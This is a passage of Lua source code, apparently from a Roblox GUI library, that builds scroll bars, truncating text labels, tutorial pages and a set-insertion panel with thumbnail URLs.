				success, err = pcall(function() layoutSimpleScrollBar() end)
			end
			if not success then print(err) end
			moveDragger()
			reentrancyGuard = false
		end

		local doScrollUp = function()
			scrollPosition = (scrollPosition) - rowSize
			if scrollPosition < 1 then scrollPosition = 1 end
			recalculate(nil)
		end

		local doScrollDown = function()
			scrollPosition = (scrollPosition) + rowSize
			recalculate(nil)
		end

		local scrollUp = function(mouseYPos)
			if scrollUpButton.Active then
				scrollStamp = tick()
				local current = scrollStamp
				local upCon
				upCon = mouseDrag.MouseButton1Up:connect(function()
					scrollStamp = tick()
					mouseDrag.Parent = nil
					upCon:disconnect()
				end)
				mouseDrag.Parent = getLayerCollectorAncestor(scrollbar)
				doScrollUp()
				wait(0.2)
				local t = tick()
				local w = 0.1
				while scrollStamp == current do
					doScrollUp()
					if mouseYPos and mouseYPos > scrollDrag.AbsolutePosition.y then
						break
					end
					if not scrollUpButton.Active then break end
					if tick()-t > 5 then
						w = 0
					elseif tick()-t > 2 then
						w = 0.06
					end
					wait(w)
				end
			end
		end

		local scrollDown = function(mouseYPos)
			if scrollDownButton.Active then
				scrollStamp = tick()
				local current = scrollStamp
				local downCon
				downCon = mouseDrag.MouseButton1Up:connect(function()
					scrollStamp = tick()
					mouseDrag.Parent = nil
					downCon:disconnect()
				end)
				mouseDrag.Parent = getLayerCollectorAncestor(scrollbar)
				doScrollDown()
				wait(0.2)
				local t = tick()
				local w = 0.1
				while scrollStamp == current do
					doScrollDown()
					if mouseYPos and mouseYPos < (scrollDrag.AbsolutePosition.y + scrollDrag.AbsoluteSize.x) then
						break
					end
					if not scrollDownButton.Active then break end
					if tick()-t > 5 then
						w = 0
					elseif tick()-t > 2 then
						w = 0.06
					end
					wait(w)
				end
			end
		end

		local y = 0
		scrollDrag.MouseButton1Down:connect(function(x,y)
			if scrollDrag.Active then
				scrollStamp = tick()
				local mouseOffset = y - scrollDrag.AbsolutePosition.y
				local dragCon
				local upCon
				dragCon = mouseDrag.MouseMoved:connect(function(x,y)
					local barAbsPos = scrollbar.AbsolutePosition.y
					local barAbsSize = scrollbar.AbsoluteSize.y

					local dragAbsSize = scrollDrag.AbsoluteSize.y
					local barAbsOne = barAbsPos + barAbsSize - dragAbsSize
					y = y - mouseOffset
					y = y < barAbsPos and barAbsPos or y > barAbsOne and barAbsOne or y
					y = y - barAbsPos

					local guiObjects = 0
					local children = frame:GetChildren()
					if children then
						for i, child in ipairs(children) do 
							if child:IsA("GuiObject") then
								guiObjects = guiObjects + 1
							end
						end
					end

					local doublePercent = y/(barAbsSize-dragAbsSize)
					local rowDiff = rowSize
					local totalScrollCount = guiObjects - (howManyDisplayed - 1)
					local newScrollPosition = math.floor((doublePercent * totalScrollCount) + 0.5) + rowDiff
					if newScrollPosition < scrollPosition then
						rowDiff = -rowDiff
					end

					if newScrollPosition < 1 then
						newScrollPosition = 1
					end

					scrollPosition = newScrollPosition
					recalculate(nil)
				end)
				upCon = mouseDrag.MouseButton1Up:connect(function()
					scrollStamp = tick()
					mouseDrag.Parent = nil
					dragCon:disconnect(); dragCon = nil
					upCon:disconnect(); drag = nil
				end)
				mouseDrag.Parent = getLayerCollectorAncestor(scrollbar)
			end
		end)

		local scrollMouseCount = 0

		scrollUpButton.MouseButton1Down:connect(
			function()
				scrollUp()
			end)
		scrollUpButton.MouseButton1Up:connect(function()
			scrollStamp = tick()
		end)


		scrollDownButton.MouseButton1Up:connect(function()
			scrollStamp = tick()
		end)
		scrollDownButton.MouseButton1Down:connect(
			function()
				scrollDown()	
			end)

		scrollbar.MouseButton1Up:connect(function()
			scrollStamp = tick()
		end)
		scrollbar.MouseButton1Down:connect(
			function(x,y)
				if y > (scrollDrag.AbsoluteSize.y + scrollDrag.AbsolutePosition.y) then
					scrollDown(y)
				elseif y < (scrollDrag.AbsolutePosition.y) then
					scrollUp(y)
				end
			end)


		frame.ChildAdded:connect(function()
			recalculate(nil)
		end)

		frame.ChildRemoved:connect(function()
			recalculate(nil)
		end)

		frame.Changed:connect(
			function(prop)
				if prop == "AbsoluteSize" then
					--Wait a heartbeat for it to sync in
					recalculate(nil)
				end
			end)
		frame.AncestryChanged:connect(function() recalculate(nil) end)

		return frame, scrollUpButton, scrollDownButton, recalculate, scrollbar
	end
	local function binaryGrow(min, max, fits)
		if min > max then
			return min
		end
		local biggestLegal = min

		while min <= max do
			local mid = min + math.floor((max - min) / 2)
			if fits(mid) and (biggestLegal == nil or biggestLegal < mid) then
				biggestLegal = mid

				--Try growing
				min = mid + 1
			else
				--Doesn't fit, shrink
				max = mid - 1
			end
		end
		return biggestLegal
	end


	local function binaryShrink(min, max, fits)
		if min > max then
			return min
		end
		local smallestLegal = max

		while min <= max do
			local mid = min + math.floor((max - min) / 2)
			if fits(mid) and (smallestLegal == nil or smallestLegal > mid) then
				smallestLegal = mid

				--It fits, shrink
				max = mid - 1			
			else
				--Doesn't fit, grow
				min = mid + 1
			end
		end
		return smallestLegal
	end


	local function getGuiOwner(instance)
		while instance ~= nil do
			if instance:IsA("ScreenGui") or instance:IsA("BillboardGui")  then
				return instance
			end
			instance = instance.Parent
		end
		return nil
	end

	t.AutoTruncateTextObject = function(textLabel)
		local text = textLabel.Text

		local fullLabel = textLabel:Clone()
		fullLabel.Name = "Full" .. textLabel.Name 
		fullLabel.BorderSizePixel = 0
		fullLabel.BackgroundTransparency = 0
		fullLabel.Text = text
		fullLabel.TextXAlignment = Enum.TextXAlignment.Center
		fullLabel.Position = UDim2.new(0,-3,0,0)
		fullLabel.Size = UDim2.new(0,100,1,0)
		fullLabel.Visible = false
		fullLabel.Parent = textLabel

		local shortText = nil
		local mouseEnterConnection = nil
		local mouseLeaveConnection= nil

		local checkForResize = function()
			if getGuiOwner(textLabel) == nil then
				return
			end
			textLabel.Text = text
			if textLabel.TextFits then 
				--Tear down the rollover if it is active
				if mouseEnterConnection then
					mouseEnterConnection:disconnect()
					mouseEnterConnection = nil
				end
				if mouseLeaveConnection then
					mouseLeaveConnection:disconnect()
					mouseLeaveConnection = nil
				end
			else
				local len = string.len(text)
				textLabel.Text = text .. "~"

				--Shrink the text
				local textSize = binaryGrow(0, len, 
					function(pos)
						if pos == 0 then
							textLabel.Text = "~"
						else
							textLabel.Text = string.sub(text, 1, pos) .. "~"
						end
						return textLabel.TextFits
					end)
				shortText = string.sub(text, 1, textSize) .. "~"
				textLabel.Text = shortText

				--Make sure the fullLabel fits
				if not fullLabel.TextFits then
					--Already too small, grow it really bit to start
					fullLabel.Size = UDim2.new(0, 10000, 1, 0)
				end

				--Okay, now try to binary shrink it back down
				local fullLabelSize = binaryShrink(textLabel.AbsoluteSize.X,fullLabel.AbsoluteSize.X, 
					function(size)
						fullLabel.Size = UDim2.new(0, size, 1, 0)
						return fullLabel.TextFits
					end)
				fullLabel.Size = UDim2.new(0,fullLabelSize+6,1,0)

				--Now setup the rollover effects, if they are currently off
				if mouseEnterConnection == nil then
					mouseEnterConnection = textLabel.MouseEnter:connect(
						function()
							fullLabel.ZIndex = textLabel.ZIndex + 1
							fullLabel.Visible = true
							--textLabel.Text = ""
						end)
				end
				if mouseLeaveConnection == nil then
					mouseLeaveConnection = textLabel.MouseLeave:connect(
						function()
							fullLabel.Visible = false
							--textLabel.Text = shortText
						end)
				end
			end
		end
		textLabel.AncestryChanged:connect(checkForResize)
		textLabel.Changed:connect(
			function(prop) 
				if prop == "AbsoluteSize" then 
					checkForResize() 	
				end 
			end)

		checkForResize()

		local function changeText(newText)
			text = newText
			fullLabel.Text = text
			checkForResize()
		end

		return textLabel, changeText
	end

	local function TransitionTutorialPages(fromPage, toPage, transitionFrame, currentPageValue)	
		if fromPage then
			fromPage.Visible = false
			if transitionFrame.Visible == false then
				transitionFrame.Size = fromPage.Size
				transitionFrame.Position = fromPage.Position
			end
		else
			if transitionFrame.Visible == false then
				transitionFrame.Size = UDim2.new(0.0,50,0.0,50)
				transitionFrame.Position = UDim2.new(0.5,-25,0.5,-25)
			end
		end
		transitionFrame.Visible = true
		currentPageValue.Value = nil

		local newSize, newPosition
		if toPage then
			--Make it visible so it resizes
			toPage.Visible = true

			newSize = toPage.Size
			newPosition = toPage.Position

			toPage.Visible = false
		else
			newSize = UDim2.new(0.0,50,0.0,50)
			newPosition = UDim2.new(0.5,-25,0.5,-25)
		end
		transitionFrame:TweenSizeAndPosition(newSize, newPosition, Enum.EasingDirection.InOut, Enum.EasingStyle.Quad, 0.3, true,
			function(state)
				if state == Enum.TweenStatus.Completed then
					transitionFrame.Visible = false
					if toPage then
						toPage.Visible = true
						currentPageValue.Value = toPage
					end
				end
			end)
	end

	t.CreateTutorial = function(name, tutorialKey, createButtons)
		local frame = Instance.new("Frame")
		frame.Name = "Tutorial-" .. name
		frame.BackgroundTransparency = 1
		frame.Size = UDim2.new(0.6, 0, 0.6, 0)
		frame.Position = UDim2.new(0.2, 0, 0.2, 0)

		local transitionFrame = Instance.new("Frame")
		transitionFrame.Name = "TransitionFrame"
		transitionFrame.Style = Enum.FrameStyle.RobloxRound
		transitionFrame.Size = UDim2.new(0.6, 0, 0.6, 0)
		transitionFrame.Position = UDim2.new(0.2, 0, 0.2, 0)
		transitionFrame.Visible = false
		transitionFrame.Parent = frame

		local currentPageValue = Instance.new("ObjectValue")
		currentPageValue.Name = "CurrentTutorialPage"
		currentPageValue.Value = nil
		currentPageValue.Parent = frame

		local boolValue = Instance.new("BoolValue")
		boolValue.Name = "Buttons"
		boolValue.Value = createButtons
		boolValue.Parent = frame

		local pages = Instance.new("Frame")
		pages.Name = "Pages"
		pages.BackgroundTransparency = 1
		pages.Size = UDim2.new(1,0,1,0)
		pages.Parent = frame

		local function getVisiblePageAndHideOthers()
			local visiblePage = nil
			local children = pages:GetChildren()
			if children then
				for i,child in ipairs(children) do
					if child.Visible then
						if visiblePage then
							child.Visible = false
						else
							visiblePage = child
						end
					end
				end
			end
			return visiblePage
		end

		local showTutorial = function(alwaysShow)
			if alwaysShow or UserSettings().GameSettings:GetTutorialState(tutorialKey) == false then
				print("Showing tutorial-",tutorialKey)
				local currentTutorialPage = getVisiblePageAndHideOthers()

				local firstPage = pages:FindFirstChild("TutorialPage1")
				if firstPage then
					TransitionTutorialPages(currentTutorialPage, firstPage, transitionFrame, currentPageValue)	
				else
					error("Could not find TutorialPage1")
				end
			end
		end

		local dismissTutorial = function()
			local currentTutorialPage = getVisiblePageAndHideOthers()

			if currentTutorialPage then
				TransitionTutorialPages(currentTutorialPage, nil, transitionFrame, currentPageValue)
			end

			UserSettings().GameSettings:SetTutorialState(tutorialKey, true)
		end

		local gotoPage = function(pageNum)
			local page = pages:FindFirstChild("TutorialPage" .. pageNum)
			local currentTutorialPage = getVisiblePageAndHideOthers()
			TransitionTutorialPages(currentTutorialPage, page, transitionFrame, currentPageValue)
		end

		return frame, showTutorial, dismissTutorial, gotoPage
	end 

	local function CreateBasicTutorialPage(name, handleResize, skipTutorial, giveDoneButton)
		local frame = Instance.new("Frame")
		frame.Name = "TutorialPage"
		frame.Style = Enum.FrameStyle.RobloxRound
		frame.Size = UDim2.new(0.6, 0, 0.6, 0)
		frame.Position = UDim2.new(0.2, 0, 0.2, 0)
		frame.Visible = false

		local frameHeader = Instance.new("TextLabel")
		frameHeader.Name = "Header"
		frameHeader.Text = name
		frameHeader.BackgroundTransparency = 1
		frameHeader.FontSize = Enum.FontSize.Size24
		frameHeader.Font = Enum.Font.ArialBold
		frameHeader.TextColor3 = Color3.new(1,1,1)
		frameHeader.TextXAlignment = Enum.TextXAlignment.Center
		frameHeader.TextWrap = true
		frameHeader.Size = UDim2.new(1,-55, 0, 22)
		frameHeader.Position = UDim2.new(0,0,0,0)
		frameHeader.Parent = frame

		local skipButton = Instance.new("ImageButton")
		skipButton.Name = "SkipButton"
		skipButton.AutoButtonColor = false
		skipButton.BackgroundTransparency = 1
		skipButton.Image = "rbxasset://textures/ui/closeButton.png"
		skipButton.MouseButton1Click:connect(function()
			skipTutorial()
		end)
		skipButton.MouseEnter:connect(function()
			skipButton.Image = "rbxasset://textures/ui/closeButton_dn.png"
		end)
		skipButton.MouseLeave:connect(function()
			skipButton.Image = "rbxasset://textures/ui/closeButton.png"
		end)
		skipButton.Size = UDim2.new(0, 25, 0, 25)
		skipButton.Position = UDim2.new(1, -25, 0, 0)
		skipButton.Parent = frame


		if giveDoneButton then
			local doneButton = Instance.new("TextButton")
			doneButton.Name = "DoneButton"
			doneButton.Style = Enum.ButtonStyle.RobloxButtonDefault
			doneButton.Text = "Done"
			doneButton.TextColor3 = Color3.new(1,1,1)
			doneButton.Font = Enum.Font.ArialBold
			doneButton.FontSize = Enum.FontSize.Size18
			doneButton.Size = UDim2.new(0,100,0,50)
			doneButton.Position = UDim2.new(0.5,-50,1,-50)

			if skipTutorial then
				doneButton.MouseButton1Click:connect(function() skipTutorial() end)
			end

			doneButton.Parent = frame
		end

		local innerFrame = Instance.new("Frame")
		innerFrame.Name = "ContentFrame"
		innerFrame.BackgroundTransparency = 1
		innerFrame.Position = UDim2.new(0,0,0,25)
		innerFrame.Parent = frame

		local nextButton = Instance.new("TextButton")
		nextButton.Name = "NextButton"
		nextButton.Text = "Next"
		nextButton.TextColor3 = Color3.new(1,1,1)
		nextButton.Font = Enum.Font.Arial
		nextButton.FontSize = Enum.FontSize.Size18
		nextButton.Style = Enum.ButtonStyle.RobloxButtonDefault
		nextButton.Size = UDim2.new(0,80, 0, 32)
		nextButton.Position = UDim2.new(0.5, 5, 1, -32)
		nextButton.Active = false
		nextButton.Visible = false
		nextButton.Parent = frame

		local prevButton = Instance.new("TextButton")
		prevButton.Name = "PrevButton"
		prevButton.Text = "Previous"
		prevButton.TextColor3 = Color3.new(1,1,1)
		prevButton.Font = Enum.Font.Arial
		prevButton.FontSize = Enum.FontSize.Size18
		prevButton.Style = Enum.ButtonStyle.RobloxButton
		prevButton.Size = UDim2.new(0,80, 0, 32)
		prevButton.Position = UDim2.new(0.5, -85, 1, -32)
		prevButton.Active = false
		prevButton.Visible = false
		prevButton.Parent = frame

		if giveDoneButton then
			innerFrame.Size = UDim2.new(1,0,1,-75)
		else
			innerFrame.Size = UDim2.new(1,0,1,-22)
		end

		local parentConnection = nil

		local function basicHandleResize()
			if frame.Visible and frame.Parent then
				local maxSize = math.min(frame.Parent.AbsoluteSize.X, frame.Parent.AbsoluteSize.Y)
				handleResize(200,maxSize)
			end
		end

		frame.Changed:connect(
			function(prop)
				if prop == "Parent" then
					if parentConnection ~= nil then
						parentConnection:disconnect()
						parentConnection = nil
					end
					if frame.Parent and frame.Parent:IsA("GuiObject") then
						parentConnection = frame.Parent.Changed:connect(
							function(parentProp)
								if parentProp == "AbsoluteSize" then
									wait()
									basicHandleResize()
								end
							end)
						basicHandleResize()
					end
				end

				if prop == "Visible" then 
					basicHandleResize()
				end
			end)

		return frame, innerFrame
	end

	t.CreateTextTutorialPage = function(name, text, skipTutorialFunc)
		local frame = nil
		local contentFrame = nil

		local textLabel = Instance.new("TextLabel")
		textLabel.BackgroundTransparency = 1
		textLabel.TextColor3 = Color3.new(1,1,1)
		textLabel.Text = text
		textLabel.TextWrap = true
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.TextYAlignment = Enum.TextYAlignment.Center
		textLabel.Font = Enum.Font.Arial
		textLabel.FontSize = Enum.FontSize.Size14
		textLabel.Size = UDim2.new(1,0,1,0)

		local function handleResize(minSize, maxSize)
			size = binaryShrink(minSize, maxSize,
				function(size)
					frame.Size = UDim2.new(0, size, 0, size)
					return textLabel.TextFits
				end)
			frame.Size = UDim2.new(0, size, 0, size)
			frame.Position = UDim2.new(0.5, -size/2, 0.5, -size/2)
		end

		frame, contentFrame = CreateBasicTutorialPage(name, handleResize, skipTutorialFunc)
		textLabel.Parent = contentFrame

		return frame
	end

	t.CreateImageTutorialPage = function(name, imageAsset, x, y, skipTutorialFunc, giveDoneButton)
		local frame = nil
		local contentFrame = nil

		local imageLabel = Instance.new("ImageLabel")
		imageLabel.BackgroundTransparency = 1
		imageLabel.Image = imageAsset
		imageLabel.Size = UDim2.new(0,x,0,y)
		imageLabel.Position = UDim2.new(0.5,-x/2,0.5,-y/2)

		local function handleResize(minSize, maxSize)
			size = binaryShrink(minSize, maxSize,
				function(size)
					return size >= x and size >= y
				end)
			if size >= x and size >= y then
				imageLabel.Size = UDim2.new(0,x, 0,y)
				imageLabel.Position = UDim2.new(0.5,-x/2, 0.5, -y/2)
			else
				if x > y then
					--X is limiter, so 
					imageLabel.Size = UDim2.new(1,0,y/x,0)
					imageLabel.Position = UDim2.new(0,0, 0.5 - (y/x)/2, 0)
				else
					--Y is limiter
					imageLabel.Size = UDim2.new(x/y,0,1, 0)
					imageLabel.Position = UDim2.new(0.5-(x/y)/2, 0, 0, 0)
				end
			end
			size = size + 50
			frame.Size = UDim2.new(0, size, 0, size)
			frame.Position = UDim2.new(0.5, -size/2, 0.5, -size/2)
		end

		frame, contentFrame = CreateBasicTutorialPage(name, handleResize, skipTutorialFunc, giveDoneButton)
		imageLabel.Parent = contentFrame

		return frame
	end

	t.AddTutorialPage = function(tutorial, tutorialPage)
		local transitionFrame = tutorial.TransitionFrame
		local currentPageValue = tutorial.CurrentTutorialPage

		if not tutorial.Buttons.Value then
			tutorialPage.NextButton.Parent = nil
			tutorialPage.PrevButton.Parent = nil
		end

		local children = tutorial.Pages:GetChildren()
		if children and #children > 0 then
			tutorialPage.Name = "TutorialPage" .. (#children+1)
			local previousPage = children[#children]
			if not previousPage:IsA("GuiObject") then
				error("All elements under Pages must be GuiObjects")
			end

			if tutorial.Buttons.Value then
				if previousPage.NextButton.Active then
					error("NextButton already Active on previousPage, please only add pages with RbxGui.AddTutorialPage function")
				end
				previousPage.NextButton.MouseButton1Click:connect(
					function()
						TransitionTutorialPages(previousPage, tutorialPage, transitionFrame, currentPageValue)
					end)
				previousPage.NextButton.Active = true
				previousPage.NextButton.Visible = true

				if tutorialPage.PrevButton.Active then
					error("PrevButton already Active on tutorialPage, please only add pages with RbxGui.AddTutorialPage function")
				end
				tutorialPage.PrevButton.MouseButton1Click:connect(
					function()
						TransitionTutorialPages(tutorialPage, previousPage, transitionFrame, currentPageValue)
					end)
				tutorialPage.PrevButton.Active = true
				tutorialPage.PrevButton.Visible = true
			end

			tutorialPage.Parent = tutorial.Pages
		else
			--First child
			tutorialPage.Name = "TutorialPage1"
			tutorialPage.Parent = tutorial.Pages
		end
	end 

	t.CreateSetPanel = function(userIdsForSets, objectSelected, dialogClosed, size, position, showAdminCategories, useAssetVersionId)

		if not userIdsForSets then
			error("CreateSetPanel: userIdsForSets (first arg) is nil, should be a table of number ids")
		end
		if type(userIdsForSets) ~= "table" and type(userIdsForSets) ~= "userdata" then
			error("CreateSetPanel: userIdsForSets (first arg) is of type " ..type(userIdsForSets) .. ", should be of type table or userdata")
		end
		if not objectSelected then
			error("CreateSetPanel: objectSelected (second arg) is nil, should be a callback function!")
		end
		if type(objectSelected) ~= "function" then
			error("CreateSetPanel: objectSelected (second arg) is of type " .. type(objectSelected) .. ", should be of type function!")
		end
		if dialogClosed and type(dialogClosed) ~= "function" then
			error("CreateSetPanel: dialogClosed (third arg) is of type " .. type(dialogClosed) .. ", should be of type function!")
		end

		if showAdminCategories == nil then -- by default, don't show beta sets
			showAdminCategories = false
		end

		local arrayPosition = 1
		local insertButtons = {}
		local insertButtonCons = {}
		local contents = nil
		local setGui = nil

		-- used for water selections
		local waterForceDirection = "NegX"
		local waterForce = "None"
		local waterGui, waterTypeChangedEvent = nil

		local Data = {}
		Data.CurrentCategory = nil
		Data.Category = {}
		local SetCache = {}

		local userCategoryButtons = nil

		local buttonWidth = 64
		local buttonHeight = buttonWidth

		local SmallThumbnailUrl = nil
		local LargeThumbnailUrl = nil
		local BaseUrl = game:GetService("ContentProvider").BaseUrl:lower()
		local AssetGameUrl = string.gsub(BaseUrl, "www", "assetgame")

		if useAssetVersionId then
			LargeThumbnailUrl = AssetGameUrl .. "Game/Tools/ThumbnailAsset.ashx?fmt=png&wd=420&ht=420&assetversionid="
			SmallThumbnailUrl = AssetGameUrl .. "Game/Tools/ThumbnailAsset.ashx?fmt=png&wd=75&ht=75&assetversionid="
		else
			LargeThumbnailUrl = AssetGameUrl .. "Game/Tools/ThumbnailAsset.ashx?fmt=png&wd=420&ht=420&aid="
			SmallThumbnailUrl = AssetGameUrl .. "Game/Tools/ThumbnailAsset.ashx?fmt=png&wd=75&ht=75&aid="
		end

		local function drillDownSetZIndex(parent, index)
			local children = parent:GetChildren()
			for i = 1, #children do
				if children[i]:IsA("GuiObject") then
					children[i].ZIndex = index
				end
				drillDownSetZIndex(children[i], index)
			end
		end

		-- for terrain stamping
		local currTerrainDropDownFrame = nil
		local terrainShapes = {"Block","Vertical Ramp","Corner Wedge","Inverse Corner Wedge","Horizontal Ramp","Auto-Wedge"}
		local terrainShapeMap = {}
		for i = 1, #terrainShapes do
			terrainShapeMap[terrainShapes[i]] = i - 1
		end	
		terrainShapeMap[terrainShapes[#terrainShapes]] = 6

		local function createWaterGui()
			local waterForceDirections = {"NegX","X","NegY","Y","NegZ","Z"}
			local waterForces = {"None", "Small", "Medium", "Strong", "Max"}

			local waterFrame = Instance.new("Frame")
			waterFrame.Name = "WaterFrame"
			waterFrame.Style = Enum.FrameStyle.RobloxSquare
			waterFrame.Size = UDim2.new(0,150,0,110)
			waterFrame.Visible = false

			local waterForceLabel = Instance.new("TextLabel")
			waterForceLabel.Name = "WaterForceLabel"
			waterForceLabel.BackgroundTransparency = 1
			waterForceLabel.Size = UDim2.new(1,0,0,12)
			waterForceLabel.Font = Enum.Font.ArialBold
			waterForceLabel.FontSize = Enum.FontSize.Size12
			waterForceLabel.TextColor3 = Color3.new(1,1,1)
			waterForceLabel.TextXAlignment = Enum.TextXAlignment.Left
			waterForceLabel.Text = "Water Force"
			waterForceLabel.Parent = waterFrame

			local waterForceDirLabel = waterForceLabel:Clone()
			waterForceDirLabel.Name = "WaterForceDirectionLabel"
			waterForceDirLabel.Text = "Water Force Direction"
			waterForceDirLabel.Position = UDim2.new(0,0,0,50)
			waterForceDirLabel.Parent = waterFrame

			local waterTypeChangedEvent = Instance.new("BindableEvent",waterFrame)
			waterTypeChangedEvent.Name = "WaterTypeChangedEvent"

			local waterForceDirectionSelectedFunc = function(newForceDirection)
				waterForceDirection = newForceDirection
				waterTypeChangedEvent:Fire({waterForce, waterForceDirection})
			end
			local waterForceSelectedFunc = function(newForce)
				waterForce = newForce
				waterTypeChangedEvent:Fire({waterForce, waterForceDirection})
			end

			local waterForceDirectionDropDown, forceWaterDirectionSelection = t.CreateDropDownMenu(waterForceDirections, waterForceDirectionSelectedFunc)
			waterForceDirectionDropDown.Size = UDim2.new(1,0,0,25)
			waterForceDirectionDropDown.Position = UDim2.new(0,0,1,3)
			forceWaterDirectionSelection("NegX")
			waterForceDirectionDropDown.Parent = waterForceDirLabel

			local waterForceDropDown, forceWaterForceSelection = t.CreateDropDownMenu(waterForces, waterForceSelectedFunc)
			forceWaterForceSelection("None")
			waterForceDropDown.Size = UDim2.new(1,0,0,25)
			waterForceDropDown.Position = UDim2.new(0,0,1,3)
			waterForceDropDown.Parent = waterForceLabel

			return waterFrame, waterTypeChangedEvent
		end

		-- Helper Function that contructs gui elements
		local function createSetGui()

			local setGui = Instance.new("ScreenGui")
			setGui.Name = "SetGui"

			local setPanel = Instance.new("Frame")
			setPanel.Name = "SetPanel"
			setPanel.Active = true
			setPanel.BackgroundTransparency = 1
			if position then
				setPanel.Position = position
			else
				setPanel.Position = UDim2.new(0.2, 29, 0.1, 24)
			end
			if size then
				setPanel.Size = size
			else
				setPanel.Size = UDim2.new(0.6, -58, 0.64, 0)
			end
			setPanel.Style = Enum.FrameStyle.RobloxRound
			setPanel.ZIndex = 6
			setPanel.Parent = setGui

			-- Children of SetPanel
			local itemPreview = Instance.new("Frame")
			itemPreview.Name = "ItemPreview"
			itemPreview.BackgroundTransparency = 1
			itemPreview.Position = UDim2.new(0.8,5,0.085,0)
			itemPreview.Size = UDim2.new(0.21,0,0.9,0)
			itemPreview.ZIndex = 6
			itemPreview.Parent = setPanel

			-- Children of ItemPreview
			local textPanel = Instance.new("Frame")
			textPanel.Name = "TextPanel"
			textPanel.BackgroundTransparency = 1
			textPanel.Position = UDim2.new(0,0,0.45,0)
			textPanel.Size = UDim2.new(1,0,0.55,0)
			textPanel.ZIndex = 6
			textPanel.Parent = itemPreview

			-- Children of TextPanel
			local rolloverText = Instance.new("TextLabel")
			rolloverText.Name = "RolloverText"
			rolloverText.BackgroundTransparency = 1
			rolloverText.Size = UDim2.new(1,0,0,48)
			rolloverText.ZIndex = 6
			rolloverText.Font = Enum.Font.ArialBold
			rolloverText.FontSize = Enum.FontSize.Size24
			rolloverText.Text = ""
			rolloverText.TextColor3 = Color3.new(1,1,1)
			rolloverText.TextWrap = true
			rolloverText.TextXAlignment = Enum.TextXAlignment.Left
			rolloverText.TextYAlignment = Enum.TextYAlignment.Top
			rolloverText.Parent = textPanel

			local largePreview = Instance.new("ImageLabel")
			largePreview.Name = "LargePreview"
			largePreview.BackgroundTransparency = 1
			largePreview.Image = ""
			largePreview.Size = UDim2.new(1,0,0,170)
			largePreview.ZIndex = 6
			largePreview.Parent = itemPreview

			local sets = Instance.new("Frame")
			sets.Name = "Sets"
			sets.BackgroundTransparency = 1
			sets.Position = UDim2.new(0,0,0,5)
			sets.Size = UDim2.new(0.23,0,1,-5)
			sets.ZIndex = 6
			sets.Parent = setPanel

			-- Children of Sets
			local line = Instance.new("Frame")
			line.Name = "Line"
			line.BackgroundColor3 = Color3.new(1,1,1)
			line.BackgroundTransparency = 0.7
			line.BorderSizePixel = 0
			line.Position = UDim2.new(1,-3,0.06,0)
			line.Size = UDim2.new(0,3,0.9,0)
			line.ZIndex = 6
			line.Parent = sets

			local setsLists, controlFrame = t.CreateTrueScrollingFrame()
			setsLists.Size = UDim2.new(1,-6,0.94,0)
			setsLists.Position = UDim2.new(0,0,0.06,0)
			setsLists.BackgroundTransparency = 1
			setsLists.Name = "SetsLists"
			setsLists.ZIndex = 6
			setsLists.Parent = sets
			drillDownSetZIndex(controlFrame, 7)

			local setsHeader = Instance.new("TextLabel")
			setsHeader.Name = "SetsHeader"
			setsHeader.BackgroundTransparency = 1
			setsHeader.Size = UDim2.new(0,47,0,24)
			setsHeader.ZIndex = 6
			setsHeader.Font = Enum.Font.ArialBold
			setsHeader.FontSize = Enum.FontSize.Size24
			setsHeader.Text = "Sets"
			setsHeader.TextColor3 = Color3.new(1,1,1)
			setsHeader.TextXAlignment = Enum.TextXAlignment.Left
			setsHeader.TextYAlignment = Enum.TextYAlignment.Top
			setsHeader.Parent = sets

			local cancelButton = Instance.new("TextButton")
			cancelButton.Name = "CancelButton"
			cancelButton.Position = UDim2.new(1,-32,0,-2)
			cancelButton.Size = UDim2.new(0,34,0,34)
			cancelButton.Style = Enum.ButtonStyle.RobloxButtonDefault
			cancelButton.ZIndex = 6
			cancelButton.Text = ""
			cancelButton.Modal = true
			cancelButton.Parent = setPanel

			-- Children of Cancel Button
			local cancelImage = Instance.new("ImageLabel")
			cancelImage.Name = "CancelImage"
			cancelImage.BackgroundTransparency = 1
			cancelImage.Image = "https://www.roblox.com/asset/?id=54135717"
			cancelImage.Position = UDim2.new(0,-2,0,-2)
			cancelImage.Size = UDim2.new(0,16,0,16)
			cancelImage.ZIndex = 6
			cancelImage.Parent = cancelButton

			return setGui
		end

		local function createSetButton(text)
			local setButton = Instance.new("TextButton")

			if text then setButton.Text = text
			else setButton.Text = "" end

			setButton.AutoButtonColor = false
			setButton.BackgroundTransparency = 1
			setButton.BackgroundColor3 = Color3.new(1,1,1)
			setButton.BorderSizePixel = 0
			setButton.Size = UDim2.new(1,-5,0,18)
			setButton.ZIndex = 6
			setButton.Visible = false
			setButton.Font = Enum.Font.Arial
			setButton.FontSize = Enum.FontSize.Size18
			setButton.TextColor3 = Color3.new(1,1,1)
			setButton.TextXAlignment = Enum.TextXAlignment.Left

			return setButton
		end

		local function buildSetButton(name, setId, setImageId, i,  count)
			local button = createSetButton(name)
			button.Text = name
			button.Name = "SetButton"
			button.Visible = true

			local setValue = Instance.new("IntValue")
			setValue.Name = "SetId"
			setValue.Value = setId
			setValue.Parent = button

			local setName = Instance.new("StringValue")
			setName.Name = "SetName"
			setName.Value = name
			setName.Parent = button

			return button
		end

		local function processCategory(sets)
			local setButtons = {}
			local numSkipped = 0
			for i = 1, #sets do
				if not showAdminCategories and sets[i].Name == "Beta" then
					numSkipped = numSkipped + 1
				else
					setButtons[i - numSkipped] = buildSetButton(sets[i].Name, sets[i].CategoryId, sets[i].ImageAssetId, i - numSkipped, #sets)
				end
			end
			return setButtons
		end

		local function handleResize()
			wait() -- neccessary to insure heartbeat happened

			local itemPreview = setGui.SetPanel.ItemPreview

			itemPreview.LargePreview.Size = UDim2.new(1,0,0,itemPreview.AbsoluteSize.X)
			itemPreview.LargePreview.Position = UDim2.new(0.5,-itemPreview.LargePreview.AbsoluteSize.X/2,0,0)
			itemPreview.TextPanel.Position = UDim2.new(0,0,0,itemPreview.LargePreview.AbsoluteSize.Y)
			itemPreview.TextPanel.Size = UDim2.new(1,0,0,itemPreview.AbsoluteSize.Y - itemPreview.LargePreview.AbsoluteSize.Y)
		end

		local function makeInsertAssetButton()
			local insertAssetButtonExample = Instance.new("Frame")
			insertAssetButtonExample.Name = "InsertAssetButtonExample"
			insertAssetButtonExample.Position = UDim2.new(0,128,0,64)
			insertAssetButtonExample.Size = UDim2.new(0,64,0,64)
			insertAssetButtonExample.BackgroundTransparency = 1
			insertAssetButtonExample.ZIndex = 6
			insertAssetButtonExample.Visible = false

			local assetId = Instance.new("IntValue")
			assetId.Name = "AssetId"
